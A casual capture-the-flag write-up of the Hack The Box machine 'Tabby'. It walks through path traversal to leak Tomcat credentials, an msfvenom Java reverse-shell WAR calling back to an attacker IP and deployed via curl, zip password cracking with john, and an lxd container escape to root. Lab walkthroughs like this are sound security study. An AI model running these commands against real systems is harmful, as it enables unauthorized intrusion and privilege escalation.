# Tabby  

Okay So yesterday I just finished an insane difficulty box and now it's time to do the opposite, finish a box but reaaallly quick  
Tabby is going to be inactive tomorrow so I'll have to finish in the day, I like to challenge myself those days

## Enumeration

Let's start with enumeration as always, and we get an ssh, 80 (apache httpd) and 8080 (apache tomcat)  
On the website (port 80) I can see a header with dead links but the news one isn't dead and apparently it fetch a file, let's try stg basic, let's add the relative path of a known file like ../../../etc/hosts and add ../ until we get a result, and it appears it is 5 ../ and we got our /etc/hosts file, so let's grab a more interesting one.  
After looking at /etc/passwd I observe that tomcat is really present and so after a bit of googling apparently I can just grab infos from file so Let's check the default installation path and have a look in it.  

## Tomcat

So apparently the default installation path is /usr/share/tomcat9 and then you have the users informations under $TOMCAT_PATH/etc/tomcat-users.xml so let's have a look but I got an empty page
But having a deeper look at the tomcat demo, the code is xml and so markup, html just don't recognize and don't show it so go under the network tab and grab the raw message to see: 

```xml
   <role rolename="admin-gui"/>
   <role rolename="manager-script"/>
   <user username="tomcat" password="$3cureP4s5w0rd123!" roles="admin-gui,manager-script"/>
```

Better than I excepted, a password :))
So after a look at tomcat process, I can with this password access the /manager part of the website and in the /text part upload stg, so let's upload a reverse shell to get control of the server and do some privilege escalation
So, as tomcat is a java process, let's generate a java reverse shell as a .war file and upload it with curl
As I'm lazy let's do it with msfvenom: `msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.124 LPORT=1337 -f war > rom1.war`
So now let's create a curl uploader:

```sh
curl -u 'tomcat':'$3cureP4s5w0rd123!' -T rom1.war 'http://10.10.10.194:8080/manager/text/deploy?path=/rom1'
```

## Reverse Shell

Alright then now let's open a listener with nc and trigger my webshell by opening *http://10.10.10.194:8080/rom1* and boom we got a shell on my listener, and I'm connected as tomcat.  
Let's spawn a bash shell (pls my eyes are bleeding rn) with `python3 -c 'import pty;pty.spawn("/bin/bash")'`  
Then go under /var/www/html to see if there is any file, and there is one called "backup.zip", setup a python server from your reverse shell and wget the file to your local machine and crack the password, I used john:

```sh
zip2john backup.zip > zip.hashes
john zip.hashes --wordlist=/usr/share/wordlists/rockyou.txt
```

And a password shows up (admin@it), let's try it to sudo as the only user on the machine and boom i got the user.txt

## Privilege escalation

So on the home we can see that the user own a alpine file and in the id stg refere to lxd which is a container for linux.  
This can be correlated.  
So I started to dig down [THIS](https://reboare.github.io/lxd/lxd-escape.html) website but apparently the machine doesn't allow me to interact with the web to fetch an image so I'll have to import one by myself.  
So I headed up to [This Article](https://book.hacktricks.xyz/linux-unix/privilege-escalation/interesting-groups-linux-pe/lxd-privilege-escalation)!  
So let's create an alpine locally with [This](https://github.com/saghul/lxd-alpine-builder) and create a webserver and upload it.  
Once done let's create the lxd and exploit it like so: 

```sh
lxc image import ./alpine-v3.12-x86_64-Rom1.tar.gz --alias rom1
lxc init rom1 rom1container -c security.privileged=true
lxc config set rom1container security.privileged=true
lxc start rom1container
lxc config device add rom1container rootdisk disk source=/ path=/mnt/root recursive=true
lxc exec rom1container /bin/sh
```

Once finished you should have a sh in another machine (the alpine one) and as you mounted the / folder recursively if you got under /mnt, you'll see your files with total access to it, so let's access our root directory and grab the root.txt

Well done this box is now pwned !!!  
I had a lotta fun doing it and it was tbh harder than what I excepted  
